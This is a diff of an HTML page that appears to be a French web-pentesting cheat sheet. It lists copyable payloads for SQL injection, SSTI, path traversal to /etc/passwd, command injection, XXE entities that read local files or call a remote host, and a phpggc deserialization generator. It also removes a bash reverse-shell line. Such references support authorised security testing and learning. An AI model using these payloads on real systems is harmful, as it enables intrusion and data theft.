@@ -6,18 +6,32 @@
         <span class="collapse-icon">▼</span>
     </div>
     <div class="card-content">
-        <p class="cmd-description">Cible : Formulaire de recherche, ID dans l'URL (?id=1), champs de login</p>
         <div class="cmd-item">
-            <div class="code-block">
-                <code>' ou " ou sleep(5) dans le paramètre</code>
-                <button class="btn-copy" title="Copier la commande">
-                    <svg width="16" height="16" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2">
-                        <rect x="9" y="9" width="13" height="13" rx="2" ry="2"></rect>
-                        <path d="M5 15H4a2 2 0 0 1-2-2V4a2 2 0 0 1 2-2h9a2 2 0 0 1 2 2v1"></path>
-                    </svg>
-                </button>
+            <p class="cmd-description">Cible : Formulaire de recherche, ID dans l'URL (?id=1), champs de login, Headers (User-Agent, Cookie)</p>
+        </div>
+
+        <div class="cmd-item">
+            <div class="code-block no-highlight">
+                <code>' ou %27 ou "  ou ') ou ')) ou '-- - ou %2D%2D%20%2D</code>
+                <button class="btn-copy"> </button>
             </div>
-            <p class="cmd-description">Test rapide</p>
+            <p class="cmd-description">Provoquer une erreur de syntaxe ou un bypass de login</p>
+        </div>
+        
+        <div class="cmd-item">
+            <div class="code-block no-highlight">
+                <code>' AND 1=1-- -  et  ' AND 1=2-- -</code>
+                <button class="btn-copy"> </button>
+            </div>
+            <p class="cmd-description">Vérifier si le contenu de la page change (SQLi aveugle)</p>
+        </div>
+        
+        <div class="cmd-item">
+            <div class="code-block no-highlight">
+                <code>' OR SLEEP(5)-- -</code>
+                <button class="btn-copy"> </button>
+            </div>
+            <p class="cmd-description">Détection par délai (MySQL/MariaDB). Si réponse > 5s -> vulnérable</p>
         </div>
 
         <div class="cmd-item">
@@ -32,18 +46,28 @@
             </div>
             <p class="cmd-description">Automatisation SQLMap avec requête Burp dans request.txt</p>
         </div>
+        
+        <div class="cmd-item">
+            <div class="code-block">
+                <code>sqlmap -u "URL?id=1" --batch --risk 3 --level 5 --dbs</code>
+                <button class="btn-copy"> </button>
+            </div>
+            <p class="cmd-description">Scan agressif si le scan de base ne trouve rien</p>
+        </div>
     </div>
 </div>
 
 <div class="card collapsible">
     <div class="card-header">
-        <h3>XSS</h3>
+        <h3>XSS (Injection de script)</h3>
         <span class="collapse-icon">▼</span>
     </div>
     <div class="card-content">
-        <li>XSS reflected : script dans URL, cibler la barre de recherche, message d'erreur</li>
-        <li>XSS stored : script en bdd, cibler les commentaires, profil utilisateur</li>
-        <li>XSS dom-based : script via client JS, cibler les fragments URL (#), les window.location</li>
+        <div class="cmd-item">
+            <li style="margin-left: 30px">XSS reflected : script dans URL, cibler la barre de recherche, message d'erreur</li>
+            <li style="margin-left: 30px">XSS stored : script en bdd, cibler les commentaires, profil utilisateur</li>
+            <li style="margin-left: 30px;">XSS dom-based : script via client JS, cibler tout ce qui est après le # dans l'URL, les window.location</li>
+        </div>
 
         <div class="cmd-item">
             <div class="code-block">
@@ -96,7 +120,42 @@
         <span class="collapse-icon">▼</span>
     </div>
     <div class="card-content">
-        <p class="cmd-description">Cible : Les paramètres qui chargent des fichiers ou des pages (?page=, ?file=)</p>
+        <div class="cmd-item">
+            <p class="cmd-description">Cible : Les paramètres qui chargent des fichiers ou des pages (?page=, ?file=)</p>
+        </div>
+
+        <div class="cmd-item">
+            <div class="code-block no-highlight">
+                <code>..%2F..%2F..%2Fetc%2Fpasswd</code>
+                <button class="btn-copy"></button>
+            </div>
+            <p class="cmd-description">Bypass via URL Encoding (..%2F = ../)</p>
+        </div>
+        
+        <div class="cmd-item">
+            <div class="code-block no-highlight">
+                <code>..%252f..%252f..%252fetc%252fpasswd</code>
+                <button class="btn-copy"></button>
+            </div>
+            <p class="cmd-description">Double encodage (si le serveur décode deux fois)</p>
+        </div>
+        
+        <div class="cmd-item">
+            <div class="code-block">
+                <code>wfuzz -c -w /usr/share/seclists/Fuzzing/LFI/LFI-Jhaddix.txt --hc 404 --hh [SIZE] "URL?path=../../../../../../FUZZ"</code>
+                <button class="btn-copy"></button>
+            </div>
+            <p class="cmd-description">Wfuzz : --hh cache les réponses de taille identique à la page d'erreur</p>
+        </div>
+        
+        <div class="cmd-item">
+            <div class="code-block">
+                <code>ffuf -u "URL?file=FUZZ" -w /usr/share/seclists/Fuzzing/LFI/LFI-Jhaddix.txt -mr "root:x:"</code>
+                <button class="btn-copy"></button>
+            </div>
+            <p class="cmd-description">Ffuf : -mr "root:x:" valide l'accès réel au fichier passwd sous Linux</p>
+        </div>
+
         <div class="cmd-item">
             <div class="code-block">
                 <code><span class="variable" data-var="url">URL</span>?file=../../../../etc/passwd</code>
@@ -125,19 +184,6 @@
 
         <div class="cmd-item">
             <div class="code-block">
-                <code>ffuf -u "<span class="variable" data-var="url">URL</span>?file=FUZZ" -w <span class="variable" data-var="wordlist">WORDLIST</span> -mr "root:x:"</code>
-                <button class="btn-copy" title="Copier la commande">
-                    <svg width="16" height="16" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2">
-                        <rect x="9" y="9" width="13" height="13" rx="2" ry="2"></rect>
-                        <path d="M5 15H4a2 2 0 0 1-2-2V4a2 2 0 0 1 2-2h9a2 2 0 0 1 2 2v1"></path>
-                    </svg>
-                </button>
-            </div>
-            <p class="cmd-description">Automatisation ffuf</p>
-        </div>
-
-        <div class="cmd-item">
-            <div class="code-block">
                 <code><span class="variable" data-var="url">URL</span>?file=php://filter/convert.base64-encode/resource=index.php</code>
                 <button class="btn-copy" title="Copier la commande">
                     <svg width="16" height="16" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2">
@@ -157,22 +203,13 @@
         <span class="collapse-icon">▼</span>
     </div>
     <div class="card-content">
-        <p class="cmd-description">Cible : Champs qui reflètent mon texte (ex: "Hello [mon_nom]")</p>
         <div class="cmd-item">
-            <div class="code-block">
-                <code>${7*7} ou {{7*7}}</code>
-                <button class="btn-copy" title="Copier la commande">
-                    <svg width="16" height="16" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2">
-                        <rect x="9" y="9" width="13" height="13" rx="2" ry="2"></rect>
-                        <path d="M5 15H4a2 2 0 0 1-2-2V4a2 2 0 0 1 2-2h9a2 2 0 0 1 2 2v1"></path>
-                    </svg>
-                </button>
-            </div>
-            <p class="cmd-description">Payload SSTI basique, si affiche 49 -> vulnérable</p>
+            <p class="cmd-description">Cible : Champs qui reflètent mon texte (ex: "Hello [mon_nom]")</p>
+            <p class="cmd-description">Action : Ajouter un paramètre, si affiche 49 -> vulnérable</p>
         </div>
         <div class="cmd-item">
             <div class="code-block">
-                <code>tplmap</code>
+                <code>{{7*7}}</code>
                 <button class="btn-copy" title="Copier la commande">
                     <svg width="16" height="16" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2">
                         <rect x="9" y="9" width="13" height="13" rx="2" ry="2"></rect>
@@ -180,11 +217,54 @@
                     </svg>
                 </button>
             </div>
-            <p class="cmd-description">Automatisation du test SSTI</p>
+            <div class="code-block">
+                <code>${7*7}</code>
+                <button class="btn-copy" title="Copier la commande">
+                    <svg width="16" height="16" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2">
+                        <rect x="9" y="9" width="13" height="13" rx="2" ry="2"></rect>
+                        <path d="M5 15H4a2 2 0 0 1-2-2V4a2 2 0 0 1 2-2h9a2 2 0 0 1 2 2v1"></path>
+                    </svg>
+                </button>
+            </div>
+            <div class="code-block">
+                <code>#{7*7}</code>
+                <button class="btn-copy" title="Copier la commande">
+                    <svg width="16" height="16" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2">
+                        <rect x="9" y="9" width="13" height="13" rx="2" ry="2"></rect>
+                        <path d="M5 15H4a2 2 0 0 1-2-2V4a2 2 0 0 1 2-2h9a2 2 0 0 1 2 2v1"></path>
+                    </svg>
+                </button>
+            </div>
+            <div class="code-block">
+                <code>&lt;%= 7*7 %&gt;</code>
+                <button class="btn-copy" title="Copier la commande">
+                    <svg width="16" height="16" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2">
+                        <rect x="9" y="9" width="13" height="13" rx="2" ry="2"></rect>
+                        <path d="M5 15H4a2 2 0 0 1-2-2V4a2 2 0 0 1 2-2h9a2 2 0 0 1 2 2v1"></path>
+                    </svg>
+                </button>
+            </div>
+            <div class="code-block">
+                <code>%7B%7B%207*7%20%7D%7D</code>
+                <button class="btn-copy" title="Copier la commande">
+                    <svg width="16" height="16" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2">
+                        <rect x="9" y="9" width="13" height="13" rx="2" ry="2"></rect>
+                        <path d="M5 15H4a2 2 0 0 1-2-2V4a2 2 0 0 1 2-2h9a2 2 0 0 1 2 2v1"></path>
+                    </svg>
+                </button>
+            </div>
+            <div class="code-block">
+                <code>%24%7B7*7%7D</code>
+                <button class="btn-copy" title="Copier la commande">
+                    <svg width="16" height="16" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2">
+                        <rect x="9" y="9" width="13" height="13" rx="2" ry="2"></rect>
+                        <path d="M5 15H4a2 2 0 0 1-2-2V4a2 2 0 0 1 2-2h9a2 2 0 0 1 2 2v1"></path>
+                    </svg>
+                </button>
+            </div>
         </div>
     </div>
 </div>
-
 
 <div class="card collapsible">
     <div class="card-header">
@@ -192,6 +272,7 @@
         <span class="collapse-icon">▼</span>
     </div>
     <div class="card-content">
+        <p class="cmd-description">Cible : Toutes les fonctionnalités où l'app semble intéragir avec le système d'exploitation (un champs de saisie d'IP, un formulaire d'IP, bouton d'export PDF, compression zip)</p>
         <div class="cmd-item">
             <div class="code-block">
                 <code>; whoami</code>
@@ -202,11 +283,12 @@
                     </svg>
                 </button>
             </div>
-            <p class="cmd-description">Injection de commande basique</p>
+            <p class="cmd-description">Injection de commande basique (Linux/Windows)</p>
         </div>
+
         <div class="cmd-item">
             <div class="code-block">
-                <code>| bash -c 'bash -i &gt;& /dev/tcp/<span class="variable" data-var="ip">IP</span>/<span class="variable" data-var="port">PORT</span> 0&gt;&1'</code>
+                <code>| id ou `id` ou $(id) ou $$ id</code>
                 <button class="btn-copy" title="Copier la commande">
                     <svg width="16" height="16" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2">
                         <rect x="9" y="9" width="13" height="13" rx="2" ry="2"></rect>
@@ -214,7 +296,33 @@
                     </svg>
                 </button>
             </div>
-            <p class="cmd-description">Reverse shell via injection</p>
+            <p class="cmd-description">Injection de commande basique (Linux)</p>
+        </div>
+
+        <div class="cmd-item">
+            <div class="code-block">
+                <code>& ipconfig</code>
+                <button class="btn-copy" title="Copier la commande">
+                    <svg width="16" height="16" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2">
+                        <rect x="9" y="9" width="13" height="13" rx="2" ry="2"></rect>
+                        <path d="M5 15H4a2 2 0 0 1-2-2V4a2 2 0 0 1 2-2h9a2 2 0 0 1 2 2v1"></path>
+                    </svg>
+                </button>
+            </div>
+            <p class="cmd-description">Injection de commande basique (Windows)</p>
+        </div>
+
+        <div class="cmd-item">
+            <div class="code-block">
+                <code>|| ping -c 10 127.0.0.1</code>
+                <button class="btn-copy" title="Copier la commande">
+                    <svg width="16" height="16" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2">
+                        <rect x="9" y="9" width="13" height="13" rx="2" ry="2"></rect>
+                        <path d="M5 15H4a2 2 0 0 1-2-2V4a2 2 0 0 1 2-2h9a2 2 0 0 1 2 2v1"></path>
+                    </svg>
+                </button>
+            </div>
+            <p class="cmd-description">Blind command injection avec délais de 10 secondes</p>
         </div>
     </div>
 </div>
@@ -222,19 +330,49 @@
 <div class="card collapsible">
     <div class="card-header">
         <h3>XXE (XML External Entity)</h3>
+        <span class="collapse-icon">▼</span>
     </div>
     <div class="card-content">
-        <p class="cmd-description">Cible : Partout où du XML est envoyé (API, imports)</p>
-        <div class="code-block">
-            <code>&lt;!DOCTYPE f [ &lt;!ENTITY xxe SYSTEM "file:///etc/passwd"&gt; ]&gt;</code>
-            <button class="btn-copy" title="Copier la commande">
-                <svg width="16" height="16" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2">
-                    <rect x="9" y="9" width="13" height="13" rx="2" ry="2"></rect>
-                    <path d="M5 15H4a2 2 0 0 1-2-2V4a2 2 0 0 1 2-2h9a2 2 0 0 1 2 2v1"></path>
-                </svg>
-            </button>
+        <div class="cmd-item"><p class="cmd-description">Cible : Partout où du XML est envoyé (API, imports)</p></div>
+
+        <div class="cmd-item">
+            <div class="code-block no-highlight">
+                <code>&lt;!DOCTYPE d [ &lt;!ENTITY test "XXE_VULN"&gt; ]&gt; ... &lt;tag&gt;&amp;test;&lt;/tag&gt;</code>
+                <button class="btn-copy" title="Copier la commande">
+                    <svg width="16" height="16" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2">
+                        <rect x="9" y="9" width="13" height="13" rx="2" ry="2"></rect>
+                        <path d="M5 15H4a2 2 0 0 1-2-2V4a2 2 0 0 1 2-2h9a2 2 0 0 1 2 2v1"></path>
+                    </svg>
+                </button>
+            </div>
+            <p class="cmd-description">Détection basique : si "XXE_VULN" s'affiche dans la réponse.</p>
         </div>
-        <p class="cmd-description">Payload à insérer dans une balise XML :<code>&lt;user&gt;&amp;xxe;&lt;/user&gt;</code></p>
+        
+        <div class="cmd-item">
+            <div class="code-block no-highlight">
+                <code>&lt;!DOCTYPE d [ &lt;!ENTITY xxe SYSTEM "file:///etc/hostname"&gt; ]&gt; ... &lt;tag&gt;&amp;xxe;&lt;/tag&gt;</code>
+                <button class="btn-copy" title="Copier la commande">
+                    <svg width="16" height="16" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2">
+                        <rect x="9" y="9" width="13" height="13" rx="2" ry="2"></rect>
+                        <path d="M5 15H4a2 2 0 0 1-2-2V4a2 2 0 0 1 2-2h9a2 2 0 0 1 2 2v1"></path>
+                    </svg>
+                </button>
+            </div>
+            <p class="cmd-description">Lecture de fichier : Hostname (Linux) ou <code>file:///C:/windows/win.ini</code> (Windows)</p>
+        </div>
+        
+        <div class="cmd-item">
+            <div class="code-block no-highlight">
+                <code>&lt;!DOCTYPE d [ &lt;!ENTITY % remote SYSTEM "http://TON_IP/ping"&gt; %remote; ]&gt;</code>
+                <button class="btn-copy" title="Copier la commande">
+                    <svg width="16" height="16" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2">
+                        <rect x="9" y="9" width="13" height="13" rx="2" ry="2"></rect>
+                        <path d="M5 15H4a2 2 0 0 1-2-2V4a2 2 0 0 1 2-2h9a2 2 0 0 1 2 2v1"></path>
+                    </svg>
+                </button>
+            </div>
+            <p class="cmd-description">Détection aveugle : Vérifier la connexion entrante via <code>nc -lvnp 80</code>.</p>
+        </div>
     </div>
 </div>
 
@@ -255,12 +393,9 @@
         <span class="collapse-icon">▼</span>
     </div>
     <div class="card-content">
-        <div class="cmd-item">
-            <p class="cmd-description">Bypass d'extension : Tenter .php5, .phtml, .phar, .php.jpg, .php%00.jpg</p>
-        </div>
-        <div class="cmd-item">
-            <p class="cmd-description">Bypass de Content-Type : Changer application/x-php en image/jpeg dans Burp.</p>
-        </div>
+        <p class="cmd-description">Cible : Input d'ajout de fichier</p>
+        <p class="cmd-description">Action : Bypass d'extension avec .php5, .phtml, .phar, .php.jpg, .php%00.jpg</p>
+        <p class="cmd-description">Action 2 : Changer application/x-php en image/jpeg dans Burp</p>
     </div>
 </div>
 
@@ -271,8 +406,7 @@
     </div>
     <div class="card-content">
         <p class="cmd-description">Cible : Formulaires/actions sensibles (changer email, mot de passe, supprimer compte)</p>
-        <p class="cmd-description">Action : Vérifier si les formulaires sensibles (password, email) ont un token unique (CSRF Token)
-        </p>
+        <p class="cmd-description">Action : Vérifier si les formulaires sensibles (password, email) ont un token unique (CSRF Token)</p>
         <div class="cmd-item">
             <p class="cmd-description">Absence de <code>&lt;input type="hidden" name="csrf_token" ...&gt;</code> dans les formulaires POST</p>
         </div>
@@ -285,11 +419,11 @@
         <span class="collapse-icon">▼</span>
     </div>
     <div class="card-content">
-        <p class="cmd-description">Cible: API</p>
+        <p class="cmd-description">Cible: Les en-têtes</p>
         <p class="cmd-description">Action : Vérifier si l'API accepte des origines arbitraires.</p>
         <div class="cmd-item">
             <div class="code-block">
-                <code>curl -H "Origin: http://evil.com" -I <span class="variable" data-var="url">URL</span></code>
+                <code>curl -H "Origin: http://corsfind.com" -I <span class="variable" data-var="url">URL</span></code>
                 <button class="btn-copy" title="Copier la commande">
                     <svg width="16" height="16" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2">
                         <rect x="9" y="9" width="13" height="13" rx="2" ry="2"></rect>
@@ -297,7 +431,7 @@
                     </svg>
                 </button>
             </div>
-            <p class="cmd-description">Si la réponse contient <code>Access-Control-Allow-Origin: http://evil.com</code> -> vulnérable</p>
+            <p class="cmd-description">Si la réponse contient <code>Access-Control-Allow-Origin: http://corsfind.com</code> -> vulnérable</p>
         </div>
     </div>
 </div>
@@ -307,7 +441,10 @@
         <h3>SSRF (Server-Side Request Forgery)</h3>
     </div>
     <div class="card-content">
-        <p class="cmd-description">Cible : Paramètres chargeant une URL (?url=, ?proxy=, ?api=).</p>
+        <div class="cmd-item">
+            <p class="cmd-description">Cible : Paramètres chargeant une URL (?url=, ?proxy=, ?api=).</p>
+            <p class="cmd-description">Action :Tenter d'accéder à l'interface localhost ou des ports internes (22, 3306, 8080).</p>
+        </div>
         <div class="code-block">
             <code>?url=http://127.0.0.1:80</code>
             <button class="btn-copy" title="Copier la commande">
@@ -317,7 +454,6 @@
                 </svg>
             </button>
         </div>
-        <p class="cmd-description">Tenter d'accéder à l'interface localhost ou des ports internes (22, 3306, 8080).</p>
     </div>
 </div>
 
@@ -327,19 +463,17 @@
         <span class="collapse-icon">▼</span>
     </div>
     <div class="card-content">
-        <p class="cmd-description">Cible : Cookies ou paramètres en Base64 contenant des objets sérialisés (PHP, Python,
-            Java).</p>
+        <p class="cmd-description">Cible : Cookies ou paramètres en Base64 contenant des objets sérialisés (PHP, Python, Java)</p>
         <div class="cmd-item">
             <p class="cmd-description">Signature PHP : <code>O:4:"User":2:{s:8:"username";s:5:"admin"...}</code></p>
-            <p class="cmd-description">Action : Décoder le Base64, modifier les valeurs (ex: <code>is_admin</code> de 0
-                à 1), ré-encoder.</p>
+            <p class="cmd-description">Action : Décoder le Base64, modifier les valeurs (ex: <code>is_admin</code> de 0 à 1), ré-encoder</p>
         </div>
         <div class="cmd-item">
             <div class="code-block">
                 <code>phpggc <span class="variable" data-var="gadget">GADGET_CHAIN</span> <span class="variable" data-var="func">FUNCTION</span> <span class="variable" data-var="cmd">COMMAND</span></code>
                 <button class="btn-copy"> </button>
             </div>
-            <p class="cmd-description">Génération de payload pour PHP (si la version/framework est connu).</p>
+            <p class="cmd-description">Génération de payload pour PHP (si la version/framework est connu)</p>
         </div>
     </div>
 </div>
